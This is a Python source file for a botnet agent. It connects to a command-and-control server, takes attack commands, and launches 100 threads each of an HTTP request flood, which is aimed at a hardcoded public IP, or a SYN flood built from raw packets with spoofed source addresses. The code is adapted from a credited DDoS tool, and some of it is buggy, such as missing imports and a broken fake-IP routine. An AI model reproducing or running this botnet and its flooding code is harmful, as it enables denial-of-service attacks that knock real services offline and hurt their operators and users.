import socket
import sys
import string
import http.client
import argparse
import threading
import select
import struct
from random import *
import time

RECV_BUFFER = 4096
ENCODING = 'utf-8'

class Bot():

	def __init__(self, server: str, port: int):
		self.master_server = server
		self.master_port = port
		self.sock: socket.socket = None
		self.master_socket: socket.socket = None
		self.authenticated = False
		self.socket_list: list[socket.socket] = []
		self.target_address: str = ''
		self.attack_type: int = 0
		self.attacking: bool = False

		
	def start(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		#self.sock.bind((self.host, self.port))							#seems to work without
		self.sock.connect((self.master_server, self.master_port))
		#self.sock.listen()												#cant listen() and connect()?
		self.socket_list.append(self.sock)
		print(f"connected to master server at {self.master_server}:{self.master_port}")    

		try:
			while True:
				read_sockets, _, exception_sockets = select.select(
					self.socket_list, [], self.socket_list
				)

				for notified_socket in read_sockets:
					self._request_router(notified_socket)

				for notified_socket in exception_sockets:
					self._disconnect_wrapper(notified_socket)

		except KeyboardInterrupt:
			print('caught keyboard interrupt, exiting')
		except Exception as e:
			print(f'ran into an error:\n\t{e}')
		finally:
			self.sock.close()
			sys.exit()

	def _request_router(self, sock: socket.socket):                        
		sock_addr = sock.getpeername()
		recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
		print(f'received request from ${sock_addr}')
		try:
			if recv_data:
				try:
					request = recv_data.split(":")
					if request[0] == 'whoami':
						self.master_socket = sock   
						self.sock.send("iam:bot".encode(ENCODING))
					elif request[0] == 'iam':
						if request[1] == 'error':                           
							print("iam command error:", request[2])
						elif request[1] == 'success': 
							self.authenticated = True
					elif request[0] == 'changeip':                              #did they decide to include port?
						self.target_address = request[1]
					elif request[0] == 'changeattk':
						self.attack_type = int(request[1])
					elif request[0] == 'startattk':          
						self.attacking = True
						if self.attack_type == 1:
							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
								t = threading.Thread(target=self.attack1)	
								t.start()

						if self.attack_type == 2:
							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
								t = threading.Thread(target=self.attack2)	
								t.start()
					elif request[0] == 'stopattk':
						self.attacking = False
					else:
						print(
							f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
						)
						response = f'{request[0]}:error:cannot handle request'.encode(
							ENCODING)
						sock.send(response)
				except ValueError:
					print(f'cannot parse request!')
					response = '_:error:cannot parse request'.encode(ENCODING)
					sock.send(response)
			# No data received means that client closed gracefully
			else:
				self._disconnect_wrapper(sock)
		# Abrupt client disconnect
		except Exception as e:
			print(e)
			self._disconnect_wrapper(sock)
		return

	def _disconnect_wrapper(self, sock: socket.socket):
		self.socket_list.remove(sock)
		sock_addr = sock.getpeername()
		sock_addr_str = '' + sock_addr[0] + str(sock_addr[1])
		print(f'master server {sock_addr_str} disconnected')
		self.sock.close()
		sys.exit()

	def attack1(self):
		attack = RequestAttack('68.146.50.254')       
		while self.attacking == True:							
			attack.run()
		
	def attack2(self):
		attack2 = SynFloodAttack(self.target_address)
		while self.attacking == True:
			attack2.run()



''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''

class RequestAttack():
	
	def __init__(self, target: str):         
		self.target = target
	
	def header(self):                                   
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		bot = self.add_bots()
		c = choice(cachetype)
		a = choice(acceptEc)
		http_header = {
			'User-Agent' : choice(self.add_useragent()),
			'Cache-Control' : c,
			'Accept-Encoding' : a,
			'Keep-Alive' : '42',
			'Host' : self.target,
			'Referer' : choice(bot)
		}
		return http_header
		
	def add_useragent(self):								### random useragents each time
		uagents = []
		uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
		uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
		uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
		uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
		uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
		uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
		uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
		uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
		return uagents

	def add_bots(self):                                     ### random websites the request comes from
		bots = []
		bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
		bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
		return bots

	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters + string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)                          ### randomstring = ___&___&___        
	
	def create_url(self):								### creates random url by adding '?' + randomstring
		return self.target + '?' + self.rand_str()

	def run(self):                                                          
		try:	
			connection = http.client.HTTPConnection(self.target, port = 9999, timeout = 1)		### hardcoded port for our target server
			url = self.create_url()
			http_header = self.header()
			method = choice(['GET','POST'])
			connection.request(method, url, None, http_header)
			connection.close()
		except socket.timeout:
			connection.close()
		except KeyboardInterrupt:
			sys.exit(print('Canceled by user'))
		except Exception as e:
			print(e)
			sys.exit()
			

class SynFloodAttack():
	def __init__(self, target: str):
		self.target = target
		self.psh = ''
		
	def checksum(self):
		s = 0

		# loop through 2 characters at a time
		for i in range(0,len(self.psh),2):
			w = ((self.psh[i]) << 8) + ((self.psh[i+1]))
			s = s + w

		s = (s>>16) + (s & 0xffff)

		# compliment and mask to 4 byte short
		s = ~s & 0xffff

		return s

	def fake_ip(self):
		skip = '127'
		rand = range(4)
		for x in range(4):
			rand[x] = randrange(0,256)
		if rand[0] == skip:
			fake_ip()
		fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
		return fkip
		
	def Building_packet(self):
		#ip header fields
		ihl = 5
		version = 4
		tos = 0
		tot = 40
		id = 54321  #id of this packet
		frag_off = 0
		ttl = 64 #255
		protocol = socket.IPPROTO_TCP  #socket
		check = 10
		src_addr = socket.inet_aton(self.fake_ip()) #"source" - spoofed - converted to binary
		dst_addr = socket.inet_aton(self.target) #destination - converted to binary

		ihl_version = (version << 4) + ihl
		#the ! in the pack format string means network order
		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, src_addr, dst_addr)

		#tcp header fields
		source = 54321 #source port -- 1234
		dest = 80      #destination port
		seq = 0
		ack_seq = 0
		doff = 5       #4 bit field, size of tcp header, 5 * 4 = 20 bytes
				#tcp flags
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)  #socket -- maximum allowed window size
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

		# the ! in the pack format string means network order
		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)

		#pseudo header fields

		placeholder = 0
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol,tcp_length)
		self.psh = self.psh + tcp_header

		tcp_checksum = self.checksum()

		# make the tcp header again and fill in the correct checksum
		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)

		#final full packet - syn packets do not have any data
		packet = ip_header + tcp_header

		return packet

	def run(self):
		self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) 
		self.sock1.connect((self.target, 8080))
		#self.sock1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)   #tell kernel not to put in headers since we are providing it
		packet=self.Building_packet()		
		try:
			self.sock1.send(packet)
		except socket.timeout:
			self.sock1.close()
		except KeyboardInterrupt:
			sys.exit(print('Canceled by user'))
		except Exception as e:
			print(e)
			sys.exit()
	  
''' end of referenced code '''

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description = 'Bot Agent')
	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
						default='', help='Interface the server listens at')
	parser.add_argument('-p', metavar='PORT', type=int, default=8080,
						help='TCP port (default 8080)')
	args = parser.parse_args()
	bot = Bot(args.a, args.p)
	bot.start()
